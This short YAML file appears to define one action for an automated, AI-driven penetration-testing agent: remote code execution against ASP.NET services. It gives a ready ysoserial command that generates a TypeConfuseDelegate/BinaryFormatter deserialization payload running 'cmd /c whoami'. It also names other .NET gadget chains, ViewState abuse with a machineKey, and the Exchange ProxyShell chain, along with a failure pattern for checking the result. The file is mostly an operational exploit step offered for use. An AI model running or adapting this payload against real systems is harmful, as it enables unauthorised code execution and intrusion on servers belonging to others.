name: rce_dotnet
category: web
description: ASP.NET RCE techniques
preconditions:
  - service.port==80
parameters:
  target_ip: from_engagement.target_ip
command_template: "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c whoami'"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: ".NET RCE: ViewState deserialization (need machineKey), BinaryFormatter, ObjectDataProvider gadgets, TypeConfuseDelegate. Also: Exchange ProxyShell chain."
